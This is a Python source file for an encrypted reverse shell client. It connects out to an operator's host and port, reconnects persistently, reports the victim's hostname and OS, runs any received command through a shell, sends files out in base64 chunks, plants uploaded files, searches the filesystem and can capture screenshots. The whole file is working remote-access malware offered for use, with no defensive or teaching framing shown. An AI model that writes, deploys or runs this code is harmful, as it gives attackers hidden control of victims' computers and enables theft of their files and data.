import socket
import subprocess
import os
import sys
from aes_crypt import AESCipher
from time import sleep
from base64 import b64encode, b64decode
from PIL import ImageGrab
import platform
import datetime


class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        while True:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                print(f"Connection error: {e}")
                sleep(10)

    def send_client_info(self):
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.conn.send(AESCipher.encrypt(client_info).encode("utf-8"))
        except Exception as e:
            print(f"Failed to send client info: {e}")

    def listen_for_commands(self):
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                else:
                    self.execute_command(decrypted_data)
        finally:
            self.conn.close()

    def handle_download(self, command):
        file_path = command.split(" ", 1)[1]
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])

        try:
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_search(self, command):
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            command = f"find / -name {file_name} 2>/dev/null"
        result = self.run_system_command(command)
        self.send_large_data(result)

    def execute_command(self, command):
        try:
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT
            )
            return output.decode("utf-8")
        except subprocess.CalledProcessError as e:
            return str(e)

    def take_screenshot(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        file_name = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(file_name)
        with open(file_name, "rb") as f:
            return b64encode(f.read()).decode("utf-8")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()
